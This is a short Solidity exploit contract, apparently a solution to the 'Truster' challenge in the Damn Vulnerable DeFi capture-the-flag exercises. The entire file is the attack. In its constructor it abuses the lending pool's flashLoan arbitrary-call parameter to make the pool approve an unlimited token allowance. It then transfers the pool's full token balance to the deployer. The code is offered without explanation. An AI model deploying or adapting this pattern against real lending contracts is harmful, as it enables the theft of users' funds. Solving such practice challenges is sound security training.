// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";


contract TrusterLenderPoolAttack  {

    constructor(DamnValuableToken _token, TrusterLenderPool _pool) {
         bytes memory approveSig= abi.encodeWithSignature("approve(address,uint256)",address(this),type(uint256).max);
        _pool.flashLoan(0, msg.sender ,address(_token),  approveSig);
        _token.transferFrom(address(_pool), msg.sender, _token.balanceOf(address(_pool)));

    }

}
